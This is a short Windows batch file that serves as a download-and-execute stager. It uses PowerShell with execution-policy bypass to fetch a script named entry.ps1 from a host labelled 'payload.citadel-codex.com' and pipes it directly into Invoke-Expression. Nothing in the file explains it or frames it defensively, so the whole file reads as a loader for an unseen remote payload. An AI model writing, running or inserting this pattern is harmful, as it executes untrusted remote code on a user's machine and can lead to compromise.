@echo off
setlocal

set "BASE_URL=https://payload.citadel-codex.com"

powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr %BASE_URL%/entry.ps1 -UseBasicParsing | iex"

endlocal
